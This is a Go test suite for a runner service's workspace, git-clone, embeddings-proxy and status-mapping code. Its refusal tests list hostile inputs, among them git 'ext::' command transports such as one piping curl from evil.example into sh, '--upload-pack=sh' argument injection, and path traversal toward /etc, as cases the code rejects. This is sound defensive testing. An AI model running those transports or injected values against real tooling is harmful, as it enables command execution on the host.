package main

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// The three methods that are not `claude.run`, and the containment rule they
// all sit behind.
//
// What is worth testing here is not that a clone clones — git does that — but
// that a caller cannot use these to reach outside the workspace, run a command
// through git's more exotic transports, or index a tenant's repositories with
// a model whose vectors nothing else can be compared against. Each of those is
// a thing that would work perfectly right up until it mattered.

// Everything on disk lives under one root. The control plane is trusted, but a
// bug there must not be able to point a clone at somebody's home directory.
func TestResolveInWorkspaceRefusesEverythingOutsideTheRoot(t *testing.T) {
	root := "/Users/x/TaskTrooper"

	bad := []struct {
		name string
		in   string
	}{
		{"parent traversal", "../secrets"},
		{"traversal in the middle", "repos/../../secrets"},
		{"absolute", "/etc"},
		{"home", "~/Documents"},
		// These become git arguments. A directory called `--upload-pack=…` is a
		// command, not a folder.
		{"a leading dash", "-upload-pack=sh"},
		{"a dash inside a segment", "repos/--exec"},
		{"empty", ""},
		{"a bare dot", "."},
		{"a bare double dot", ".."},
	}
	for _, tc := range bad {
		t.Run(tc.name, func(t *testing.T) {
			if got, err := resolveInWorkspace(root, tc.in); err == nil {
				t.Fatalf("resolveInWorkspace(%q) = %q, want a refusal", tc.in, got)
			}
		})
	}

	good := map[string]string{
		"repos/acme-api":    root + "/repos/acme-api",
		"repos/acme.api_v2": root + "/repos/acme.api_v2",
		"repos/a/b/c":       root + "/repos/a/b/c",
		"repos/./acme-api":  root + "/repos/acme-api",
	}
	for in, want := range good {
		got, err := resolveInWorkspace(root, in)
		if err != nil {
			t.Fatalf("resolveInWorkspace(%q): %v", in, err)
		}
		if got != want {
			t.Fatalf("resolveInWorkspace(%q) = %q, want %q", in, got, want)
		}
	}
}

// git's transports are not all fetches. `ext::` takes a COMMAND — `git clone
// "ext::sh -c whoami"` runs it — and `--upload-pack` names another. Nothing
// but plain https and ssh gets past here, and the refusal is on the URL rather
// than on a list of known-bad prefixes, because the next transport nobody has
// heard of is refused by the same rule.
func TestCheckRepoURLRefusesEverythingButHTTPSAndSSH(t *testing.T) {
	bad := []string{
		"ext::sh -c whoami",
		"ext::curl https://evil.example/x | sh",
		"file:///etc",
		"/etc/passwd",
		"--upload-pack=sh",
		"-u git@github.com:acme/api.git",
		"https://example.com/a b",
		"",
		"git://github.com/acme/api.git",
	}
	for _, url := range bad {
		if err := checkRepoURL(url); err == nil {
			t.Fatalf("checkRepoURL(%q) was accepted", url)
		}
	}

	good := []string{
		"https://github.com/acme/api.git",
		"https://token@github.com/acme/api.git",
		"ssh://git@github.com/acme/api.git",
		"git@github.com:acme/api.git",
	}
	for _, url := range good {
		if err := checkRepoURL(url); err != nil {
			t.Fatalf("checkRepoURL(%q): %v", url, err)
		}
	}
}

// workspace.prepare must refuse a directory that exists and is not a
// repository rather than clearing it. It is somebody's folder, and deleting a
// user's files to make room is not a decision a runner gets to make.
func TestPrepareRefusesToClobberADirectoryThatIsNotARepository(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "repos", "notes"), 0o755); err != nil {
		t.Fatalf("creating the directory: %v", err)
	}
	if err := os.WriteFile(filepath.Join(root, "repos", "notes", "important.txt"), []byte("mine"), 0o644); err != nil {
		t.Fatalf("writing the file: %v", err)
	}

	c := &call{
		ctx:    context.Background(),
		id:     "c-1",
		cfg:    config{workspaceDir: root, gitBin: "/usr/bin/git"},
		params: json.RawMessage(`{"repo_url":"https://github.com/acme/api.git","dir":"notes"}`),
		w:      &syncBuffer{},
	}
	_, err := prepareWorkspace(c)
	if err == nil {
		t.Fatal("prepareWorkspace overwrote a directory that was not a repository")
	}
	if !strings.Contains(err.Message, "not a git repository") {
		t.Fatalf("error = %q, want it to say the directory is not a repository", err.Message)
	}
	if _, statErr := os.Stat(filepath.Join(root, "repos", "notes", "important.txt")); statErr != nil {
		t.Fatalf("the user's file was removed: %v", statErr)
	}
}

// The embeddings pin, which is a refusal rather than a correction.
//
// Every vector in a tenant's indexes was produced by one model, and vectors
// from two models are not comparable — they need not even share a dimension
// count. Quietly substituting the pinned model would produce results that look
// fine and mean nothing, which is strictly worse than an error naming both.
func TestEmbeddingsRefuseAModelThatIsNotThePinnedOne(t *testing.T) {
	c := &call{
		ctx:    context.Background(),
		id:     "c-1",
		cfg:    config{embeddingModel: "nomic-embed-text-v1.5", embeddingsBaseURL: "http://127.0.0.1:1/v1"},
		params: json.RawMessage(`{"model":"text-embedding-3-small","input":["hello"]}`),
		w:      &syncBuffer{},
	}
	_, _, err := createEmbeddings(c)
	if err == nil {
		t.Fatal("a request for another model was served")
	}
	if err.Code != codeBadRequest || !strings.Contains(err.Message, "nomic-embed-text-v1.5") {
		t.Fatalf("error = %s/%q, want a bad_request naming the pinned model", err.Code, err.Message)
	}
}

// A Mac with no local embedding engine configured is an ordinary case — not_ready, the
// way mobile.* answers a capability this Mac does not have, and never
// codeUpstream: nothing here failed to reach anything, because there was
// nothing configured to reach.
func TestEmbeddingsReportNotReadyWithNoLocalEngine(t *testing.T) {
	for name, cfg := range map[string]config{
		"neither field set":     {},
		"model set, no url":     {embeddingModel: "nomic-embed-text-v1.5"},
		"url set, no model pin": {embeddingsBaseURL: "http://127.0.0.1:1/v1"},
	} {
		t.Run(name, func(t *testing.T) {
			_, _, err := createEmbeddings(&call{
				ctx:    context.Background(),
				id:     "c-1",
				cfg:    cfg,
				state:  newState(),
				params: json.RawMessage(`{"input":"hello"}`),
			})
			if err == nil {
				t.Fatal("a call with no local embedding engine configured was served")
			}
			if err.Code != codeNotReady {
				t.Fatalf("code = %q, want %s", err.Code, codeNotReady)
			}
		})
	}

	// And end to end: the handler answers 409, not the embeddings method's
	// own 502/400 statuses.
	res := request(t, config{}, newState(), http.MethodPost, "/embeddings.create", `{"input":"hello"}`)
	if res.status != http.StatusConflict {
		t.Fatalf("status = %d, want 409", res.status)
	}
	if res.code() != codeNotReady {
		t.Fatalf("code = %q, want %s", res.code(), codeNotReady)
	}
}

// The proxy half, against a real HTTP server standing in for LM Studio: the
// pinned model is what is sent whatever the caller said, and the answer comes
// back untouched.
func TestEmbeddingsProxyPinsTheModelAndPassesTheAnswerThrough(t *testing.T) {
	var sawModel string
	var sawInput json.RawMessage
	lm := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/v1/embeddings" {
			t.Errorf("LM Studio was asked for %q, want /v1/embeddings", r.URL.Path)
		}
		var body struct {
			Model string          `json:"model"`
			Input json.RawMessage `json:"input"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			t.Errorf("decoding the request: %v", err)
		}
		sawModel = body.Model
		sawInput = body.Input
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"object":"list","data":[{"embedding":[0.1,0.2],"index":0}],"model":"nomic-embed-text-v1.5"}`))
	}))
	defer lm.Close()

	c := &call{
		ctx: context.Background(),
		id:  "c-1",
		cfg: config{
			embeddingModel:    "nomic-embed-text-v1.5",
			embeddingsBaseURL: lm.URL + "/v1",
		},
		params: json.RawMessage(`{"input":["hello","world"]}`),
		w:      &syncBuffer{},
	}

	status, raw, err := createEmbeddings(c)
	if err != nil {
		t.Fatalf("createEmbeddings: %s", err.Message)
	}
	if status != http.StatusOK {
		t.Fatalf("status = %d, want LM Studio's 200", status)
	}
	if sawModel != "nomic-embed-text-v1.5" {
		t.Fatalf("LM Studio was asked for model %q, want the pinned one", sawModel)
	}
	// The input is forwarded verbatim rather than re-encoded, so nothing this
	// program does can change the text that gets embedded.
	if string(sawInput) != `["hello","world"]` {
		t.Fatalf("input arrived as %s, want it untouched", sawInput)
	}

	var answer map[string]any
	if err := json.Unmarshal(raw, &answer); err != nil {
		t.Fatalf("the passed-through answer is not JSON: %v", err)
	}
	if answer["object"] != "list" {
		t.Fatalf("the answer was reshaped: %v", answer)
	}
}

// LM Studio's own status and body survive the trip, unchanged.
//
// A 404 here means "that model is not loaded" — a fact this side could not have
// worked out and cannot express in a status of its own. Re-labelling it as a
// 502 from this Mac would send the caller looking for a network problem that
// does not exist, and the caller's OpenAI-compatible client already knows how
// to read a 404 with an `error` object.
func TestEmbeddingsPassLMStudiosStatusAndBodyThrough(t *testing.T) {
	lm := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNotFound)
		_, _ = w.Write([]byte(`{"error":"Model 'nomic-embed-text-v1.5' is not loaded"}`))
	}))
	defer lm.Close()

	cfg := config{embeddingModel: "nomic-embed-text-v1.5", embeddingsBaseURL: lm.URL + "/v1"}

	status, body, err := createEmbeddings(&call{
		ctx:    context.Background(),
		id:     "c-1",
		cfg:    cfg,
		params: json.RawMessage(`{"input":"hello"}`),
	})
	if err != nil {
		t.Fatalf("createEmbeddings turned LM Studio's 404 into an error of its own: %s", err.Message)
	}
	if status != http.StatusNotFound {
		t.Fatalf("status = %d, want LM Studio's 404", status)
	}
	if !strings.Contains(string(body), "is not loaded") {
		t.Fatalf("body = %s, want LM Studio's own words", body)
	}

	// And end to end, through the handler, because the status only helps if it
	// reaches the wire.
	res := request(t, cfg, newState(), http.MethodPost, "/embeddings.create", `{"input":"hello"}`)
	if res.status != http.StatusNotFound {
		t.Fatalf("the handler answered %d, want LM Studio's 404", res.status)
	}
	if !strings.Contains(res.body, "is not loaded") {
		t.Fatalf("the handler answered %q, want LM Studio's own body", res.body)
	}
}

// This Mac's own status is reserved for the failures that are this Mac's: LM
// Studio not answering at all is a 502, because there is no upstream status to
// forward.
func TestEmbeddingsReportAnUnreachableLMStudioAsUpstream(t *testing.T) {
	cfg := config{embeddingModel: "nomic-embed-text-v1.5", embeddingsBaseURL: "http://127.0.0.1:1/v1"}
	res := request(t, cfg, newState(), http.MethodPost, "/embeddings.create", `{"input":"hello"}`)
	if res.status != http.StatusBadGateway {
		t.Fatalf("status = %d, want 502", res.status)
	}
	if res.code() != codeUpstream {
		t.Fatalf("code = %q, want %s", res.code(), codeUpstream)
	}
	// The address, because "not running" and "running somewhere else" are the
	// two causes and only the address separates them.
	if !strings.Contains(res.body, "127.0.0.1:1") {
		t.Fatalf("the error does not name the address it tried: %s", res.body)
	}
}

// A report that has not arrived is said plainly. "No report yet" and "a report
// that found nothing" are different facts, and a caller that could not tell
// them apart would show a healthy Mac as having nothing installed.
func TestPreflightReportSaysSoBeforeOneHasArrived(t *testing.T) {
	res := request(t, config{}, newState(), http.MethodGet, "/preflight.report", "")
	if res.status != http.StatusConflict {
		t.Fatalf("status = %d, want 409", res.status)
	}
	if res.code() != codeNotReady {
		t.Fatalf("code = %q, want %s", res.code(), codeNotReady)
	}
}

// And once one has arrived it comes back verbatim: this program relays the
// desktop app's report, it does not re-encode or summarise it.
func TestPreflightReportIsRelayedUnchanged(t *testing.T) {
	st := newState()
	const report = `{"generatedAt":17,"ready":true,"items":[{"id":"claude","status":"ok"}]}`
	st.setPreflight(json.RawMessage(report))

	res := request(t, config{}, st, http.MethodGet, "/preflight.report", "")
	if res.status != http.StatusOK {
		t.Fatalf("status = %d, want 200", res.status)
	}
	var got, want map[string]any
	if err := json.Unmarshal([]byte(res.body), &got); err != nil {
		t.Fatalf("the relayed report is not JSON: %v", err)
	}
	_ = json.Unmarshal([]byte(report), &want)
	if got["generatedAt"] != want["generatedAt"] || got["ready"] != want["ready"] {
		t.Fatalf("the report was altered on the way through: %s", res.body)
	}
}

// What the runner knows about itself rides on the report, after the app's own
// fields, so the cloud can feature-detect durable runs.
func TestPreflightAdvertisesTheRunCapabilities(t *testing.T) {
	st := newState()
	st.setPreflight(json.RawMessage(`{"generatedAt":17,"ready":true,"items":[]}`))
	res := request(t, config{}, st, http.MethodGet, "/preflight.report", "")
	var got struct {
		GeneratedAt  int      `json:"generatedAt"`
		Capabilities []string `json:"capabilities"`
	}
	if err := json.Unmarshal([]byte(res.body), &got); err != nil {
		t.Fatalf("the report is not JSON: %v (%s)", err, res.body)
	}
	if got.GeneratedAt != 17 || strings.Join(got.Capabilities, ",") != "run.attach,run.status" {
		t.Fatalf("report = %s, want the app's fields and the runner's capabilities", res.body)
	}
	if got := string(withRunnerFields(json.RawMessage(`{}`), map[string]any{"a": 1})); got != `{"a":1}` {
		t.Fatalf("an empty report became %s", got)
	}
}

// The status mapping, which is the half of the contract a caller branches on
// before it has read a body.
//
// Each code maps onto exactly one status and the code string is repeated in the
// body, so a caller may switch on either and can never see them disagree.
func TestStatusCodeMapping(t *testing.T) {
	if got := statusFor(codeBadRequest); got != http.StatusBadRequest {
		t.Fatalf("bad_request -> %d, want 400", got)
	}
	if got := statusFor(codeUnsupportedMethod); got != http.StatusNotFound {
		t.Fatalf("unsupported_method -> %d, want 404", got)
	}
	if got := statusFor(codeNotReady); got != http.StatusConflict {
		t.Fatalf("not_ready -> %d, want 409", got)
	}
	// 499, not 408. A 408 is a REQUEST timeout — the server gave up waiting for
	// the client to finish sending — and every cancellation here is the
	// opposite: the request arrived, the work started, and the client went away.
	if got := statusFor(codeCancelled); got != 499 {
		t.Fatalf("cancelled -> %d, want 499", got)
	}
	if got := statusFor(codeUpstream); got != http.StatusBadGateway {
		t.Fatalf("upstream -> %d, want 502", got)
	}
	if got := statusFor(codeInternal); got != http.StatusInternalServerError {
		t.Fatalf("internal -> %d, want 500", got)
	}
	// A code nobody mapped is a bug here, not a 200 the caller has to guess at.
	if got := statusFor("something-new"); got != http.StatusInternalServerError {
		t.Fatalf("an unmapped code -> %d, want 500", got)
	}
}

// A malformed or misaddressed request is answered with a status AND a code,
// never dropped and never bare. A caller that got silence would wait out its
// own timeout for a bug it could have been told about.
func TestBadRequestsAnswerWithBothAStatusAndACode(t *testing.T) {
	cfg := config{workspaceDir: t.TempDir()}
	cases := []struct {
		name   string
		method string
		path   string
		body   string
		status int
		code   string
	}{
		{"an unknown path", http.MethodPost, "/nope", "{}", http.StatusNotFound, codeUnsupportedMethod},
		{"the wrong verb on a real path", http.MethodGet, "/claude.run", "", http.StatusNotFound, codeUnsupportedMethod},
		{"a POST on the report", http.MethodPost, "/preflight.report", "{}", http.StatusNotFound, codeUnsupportedMethod},
		{"a body that is not JSON", http.MethodPost, "/claude.run", "hello", http.StatusBadRequest, codeBadRequest},
		{"no prompt", http.MethodPost, "/claude.run", `{"workspace":"repo"}`, http.StatusBadRequest, codeBadRequest},
		{"a workspace outside the root", http.MethodPost, "/claude.run", `{"workspace":"../etc","prompt":"go"}`, http.StatusBadRequest, codeBadRequest},
		{"a cancel with no id", http.MethodPost, "/cancel", "{}", http.StatusBadRequest, codeBadRequest},
		{"a repo url git would treat as a command", http.MethodPost, "/workspace.prepare", `{"repo_url":"ext::sh -c whoami","dir":"x"}`, http.StatusBadRequest, codeBadRequest},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := request(t, cfg, newState(), tc.method, tc.path, tc.body)
			if res.status != tc.status {
				t.Fatalf("status = %d, want %d (body %s)", res.status, tc.status, res.body)
			}
			if res.code() != tc.code {
				t.Fatalf("code = %q, want %q (body %s)", res.code(), tc.code, res.body)
			}
		})
	}
}

// A cancel for a call that has already finished is not an error. That race is
// ordinary — the run ends while the cancel is in flight — and turning it into a
// 4xx would make callers treat a successful stop as a fault.
func TestCancelForAnUnknownCallIsNotAnError(t *testing.T) {
	res := request(t, config{}, newState(), http.MethodPost, "/cancel", `{"id":"run-that-already-finished"}`)
	if res.status != http.StatusOK {
		t.Fatalf("status = %d, want 200", res.status)
	}
	var got cancelResponse
	if err := json.Unmarshal([]byte(res.body), &got); err != nil {
		t.Fatalf("body %q is not the cancel response: %v", res.body, err)
	}
	if got.Cancelled {
		t.Fatal("a cancel for a call nobody is running reported that it stopped one")
	}
}

// response is one answer from the runner, read whole.
type response struct {
	status int
	body   string
}

// code digs the error code out of the body. Every failure carries one, which is
// what lets a caller keep switching on a string rather than on a number.
func (r response) code() string {
	var parsed errorBody
	if err := json.Unmarshal([]byte(r.body), &parsed); err != nil {
		return ""
	}
	return parsed.Error.Code
}

// request drives one call against a real HTTP server running the real handler.
//
// A real server rather than an httptest.ResponseRecorder, because the contract
// under test is HTTP: a status line, headers, and a body that has to survive
// being written to a socket. A recorder would assert that the handler assigned
// some fields.
func request(t *testing.T, cfg config, st *state, method, path, body string) response {
	t.Helper()
	srv := httptest.NewServer(newRunnerServer(cfg, st).handler())
	t.Cleanup(srv.Close)

	var reader io.Reader
	if body != "" {
		reader = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, srv.URL+path, reader)
	if err != nil {
		t.Fatalf("building the request: %v", err)
	}
	res, err := srv.Client().Do(req)
	if err != nil {
		t.Fatalf("%s %s: %v", method, path, err)
	}
	defer func() { _ = res.Body.Close() }()
	raw, err := io.ReadAll(res.Body)
	if err != nil {
		t.Fatalf("reading the response: %v", err)
	}
	return response{status: res.StatusCode, body: string(raw)}
}

// --- the branch a caller asks for -------------------------------------------

// gitBinForTest is the git these prepare tests drive. Found rather than
// assumed: /usr/bin/git is a macOS path and this suite also runs on Linux.
func gitBinForTest(t *testing.T) string {
	t.Helper()
	for _, candidate := range []string{"/usr/bin/git", "/opt/homebrew/bin/git", "/usr/local/bin/git", "/bin/git"} {
		if info, err := os.Stat(candidate); err == nil && !info.IsDir() {
			return candidate
		}
	}
	t.Skip("no git on this machine; workspace.prepare cannot be exercised")
	return ""
}

// originWithBranch builds a real repository with a second branch and returns a
// URL prepare can clone. A real remote rather than a fake, because what is
// under test is WHICH git command runs, and only git can answer that.
//
// `alsoADirectoryNamed` is tracked content sharing a name with the branch. That
// collision is what turns a pathspec misreading from a loud error into a silent
// wrong answer, so it is the case the test is built around.
func originWithBranch(t *testing.T, branch, alsoADirectoryNamed string) string {
	t.Helper()
	gitBin := gitBinForTest(t)
	origin := filepath.Join(t.TempDir(), "origin")

	run := func(args ...string) {
		t.Helper()
		cmd := exec.Command(gitBin, args...)
		cmd.Dir = origin
		// The test's own repository, not the developer's: a global config with
		// an `init.defaultBranch` or a commit template would otherwise decide
		// what this fixture is.
		cmd.Env = append(os.Environ(),
			"GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@t",
			"GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@t",
			"GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null",
		)
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
	write := func(text string) {
		t.Helper()
		path := filepath.Join(origin, alsoADirectoryNamed, "a.txt")
		if err := os.WriteFile(path, []byte(text), 0o644); err != nil {
			t.Fatalf("writing %s: %v", path, err)
		}
	}

	if err := os.MkdirAll(filepath.Join(origin, alsoADirectoryNamed), 0o755); err != nil {
		t.Fatalf("creating the origin: %v", err)
	}
	run("init", "-q", "-b", "main")
	write("hi\n")
	run("add", ".")
	run("commit", "-qm", "init")
	run("checkout", "-q", "-b", branch)
	write("hi\nthere\n")
	run("commit", "-qam", "on the branch")
	run("checkout", "-q", "main")
	return "file://" + origin
}

// prepareCall drives the two halves of workspace.prepare that talk to git.
//
// It calls gitClone and gitFetch directly rather than going through
// prepareWorkspace, for the reason the test above exists: checkRepoURL allows
// only https and ssh, so the local remote these tests need would be refused
// before git ever ran. Bypassing the gate is the point — it is the gate's own
// test that proves it holds, and what is under test here is which git command
// runs behind it.
func prepareCall(t *testing.T, gitBin, repoURL, dir, branch string) (string, *rpcError) {
	t.Helper()
	c := &call{
		ctx: context.Background(),
		id:  "c-prepare",
		cfg: config{workspaceDir: filepath.Dir(dir), gitBin: gitBin},
		w:   &syncBuffer{},
	}
	p := prepareParams{RepoURL: repoURL, Branch: branch}

	if _, err := os.Stat(filepath.Join(dir, ".git")); err != nil {
		if callErr := gitClone(c, p, dir); callErr != nil {
			return "", callErr
		}
	} else if callErr := gitFetch(c, p, dir); callErr != nil {
		return "", callErr
	}
	return currentBranch(c, dir)
}

// The branch a caller names is the branch the checkout ends up on — on the
// clone, and again on every prepare after it.
//
// Both halves have been wrong at once. `git checkout -- <name>` declares <name>
// a PATHSPEC, so it can never switch a branch: on a repeat prepare it failed
// with "pathspec did not match", and the `-b --track` fallback failed straight
// after it because the local branch was already there — so the whole call was a
// 502. Where the branch shared a name with tracked content it was worse: the
// pathspec matched, git restored those files, the command SUCCEEDED, and the
// checkout stayed on the default branch while prepare reported that branch back
// and the session ran the task on it.
//
// The second prepare is the half a happy-path test misses, which is why it is
// here rather than an assertion about the first.
func TestPrepareChecksOutTheBranchOnACheckoutThatAlreadyExists(t *testing.T) {
	gitBin := gitBinForTest(t)
	repoURL := originWithBranch(t, "docs", "docs")
	dir := filepath.Join(t.TempDir(), "api")

	first, err := prepareCall(t, gitBin, repoURL, dir, "docs")
	if err != nil {
		t.Fatalf("the first prepare failed: %s", err.Message)
	}
	if first != "docs" {
		t.Fatalf("after cloning, the checkout is on %q, want the branch the caller asked for", first)
	}

	// The same call again, against the checkout the first one left behind: a
	// task is prepared, run, and prepared again, and this is the ordinary case.
	second, err := prepareCall(t, gitBin, repoURL, dir, "docs")
	if err != nil {
		t.Fatalf("the second prepare failed: %s", err.Message)
	}
	if second != "docs" {
		t.Fatalf("the second prepare left the checkout on %q, want docs", second)
	}

	// And once more from the OTHER branch, which is the state a finished
	// session leaves behind: the switch has to happen, not merely not fail.
	if _, err := prepareCall(t, gitBin, repoURL, dir, "main"); err != nil {
		t.Fatalf("switching back to main failed: %s", err.Message)
	}
	third, err := prepareCall(t, gitBin, repoURL, dir, "docs")
	if err != nil {
		t.Fatalf("switching to docs from main failed: %s", err.Message)
	}
	if third != "docs" {
		t.Fatalf("prepare left the checkout on %q after being asked for docs", third)
	}
}

// `dir` is required, and the reason is a silent wrong answer rather than a
// tidiness rule.
//
// filepath.Join("repos", "") is "repos", so a missing dir cloned straight into
// the repositories folder — and the NEXT prepare, for a DIFFERENT repository
// and also with no dir, found a `.git` there, fetched inside the first
// repository, and answered `{cloned:false}` with a path belonging to neither.
// A caller would have been told its repository was ready when what was on disk
// was somebody else's.
func TestPrepareRequiresADirectory(t *testing.T) {
	root := t.TempDir()
	for _, missing := range []string{`{"repo_url":"https://github.com/acme/api.git"}`,
		`{"repo_url":"https://github.com/acme/api.git","dir":""}`,
		`{"repo_url":"https://github.com/acme/api.git","dir":"   "}`} {
		c := &call{
			ctx:    context.Background(),
			id:     "c-nodir",
			cfg:    config{workspaceDir: root, gitBin: "/usr/bin/git"},
			params: json.RawMessage(missing),
			w:      &syncBuffer{},
		}
		_, err := prepareWorkspace(c)
		if err == nil {
			t.Fatalf("prepare accepted %s and would have cloned into the repositories folder itself", missing)
		}
		if err.Code != codeBadRequest {
			t.Fatalf("code = %q, want %q", err.Code, codeBadRequest)
		}
		if !strings.Contains(err.Message, "dir is required") {
			t.Fatalf("message = %q, want it to name the missing field", err.Message)
		}
	}
	// And nothing was created for a request that was refused.
	if _, statErr := os.Stat(filepath.Join(root, repoSubdir)); statErr == nil {
		t.Fatal("a refused prepare created the repositories folder anyway")
	}
}

// A branch the remote does not have is a failure the caller is told about, not
// a checkout quietly left on whatever HEAD happened to be — which is what a
// prepare reporting the wrong branch back becomes one call later.
func TestPrepareRefusesABranchTheRemoteDoesNotHave(t *testing.T) {
	gitBin := gitBinForTest(t)
	repoURL := originWithBranch(t, "docs", "docs")
	dir := filepath.Join(t.TempDir(), "api")

	if _, err := prepareCall(t, gitBin, repoURL, dir, ""); err != nil {
		t.Fatalf("the initial clone failed: %s", err.Message)
	}
	_, err := prepareCall(t, gitBin, repoURL, dir, "nope")
	if err == nil {
		t.Fatal("prepare reported success for a branch the remote does not have")
	}
	if err.Code != codeUpstream {
		t.Fatalf("code = %q, want %q", err.Code, codeUpstream)
	}
}
